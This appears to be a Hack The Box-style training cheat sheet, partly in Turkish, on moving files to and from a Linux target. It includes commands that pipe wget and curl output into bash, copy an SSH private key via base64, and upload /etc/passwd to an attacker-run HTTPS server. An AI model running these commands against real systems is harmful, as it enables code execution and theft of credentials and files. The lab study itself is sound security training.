# Linux File Transfer Methods

## Download Operations

### Base64 Copy

!!! warning

    Bu yöntem büyük dosyalar için kullanılamaz.

#### Encode

```shell
htb-student@nix04:~$ cat id_rsa | base64 -w 0
```

```output title="Output"

```

#### Decode

```shell
my@attack:~$ echo -n  | base64 -d > id_rsa
```

#### Compare Remote and Local Checksums

=== "REMOTE"

    ```shell
    htb-student@nix04:~$ md5sum id_rsa
    ```

=== "LOCAL"

    ```shell
    my@attack:~$ md5sum id_rsa
    ```

```output title="Output"
4e301756a07ded0a2dd6953abf015278  id_rsa
```

### Web File Transfer Method

#### Creating a Web Server

##### Python

```shell
htb-student@nix04:~$ python3 -m http.server 8000
```

##### PHP

```shell
htb-student@nix04:~$ php -S 0.0.0.0:8000
```

##### Ruby

```shell
htb-student@nix04:~$ ruby -run -e httpd . -p 8000
```

#### Downloading with Wget

```shell
my@attack:~$ wget -q 'http://10.129.68.201:8000/file.txt' -O file.txt
```

#### Downloading with Wget (Fileless)

```shell
my@attack:~$ wget -q 'http://10.129.68.201:8000/file.txt' -O- | bash
```

#### Downloading with cURL

```shell
my@attack:~$ curl -s 'http://10.129.68.201:8000/file.txt' -o file.txt
```

#### Downloading with cURL (Fileless)

```shell
my@attack:~$ curl -s 'http://10.129.68.201:8000/file.txt' | bash
```

### SSH Downloads

#### Enable the SSH Service

```shell
my@attack:~$ sudo systemctl enable sshd --now
```

#### Check for SSH Listening Port

```shell
my@attack:~$ sudo ss -lntp
```

#### Download a File with SCP

```shell
my@attack:~$ scp htb-student@10.129.68.201:/etc/passwd .
```

## Upload Operations

### Upload a File with SCP

```shell
my@attack:~$ scp file.txt htb-student@10.129.68.201:/home/htb-student/
```

### cURL Web Uploads

Geçici bir dizine geçiş yap:

```shell
my@attack:~$ cd /tmp
```

Gerekli Python paketlerini yükle:

```shell
my@attack:/tmp$ sudo pip3 install uploadserver
```

Kendinden imzalı bir sertifika oluştur:

```shell
my@attack:/tmp$ openssl req -x509 -out /tmp/server.pem -keyout /tmp/server.pem -newkey rsa:4096 -nodes
```

Sertifikanın bulunmadığı bir dizine geçiş yap:

```shell
my@attack:/tmp$ cd ~
```

Yükleme işlemini destekleyen bir web sunucusu başlat:

```shell
my@attack:~$ sudo python3 -m uploadserver 443 --server-certificate /tmp/server.pem
```

Uzak Linux bilgisayarında bulunan bir dosyayı yerel sunucuya yükle:

```shell
htb-student@nix04:~$ curl -s 'https://10.10.14.229/upload' -X POST -F 'files=@/etc/passwd' --insecure
```
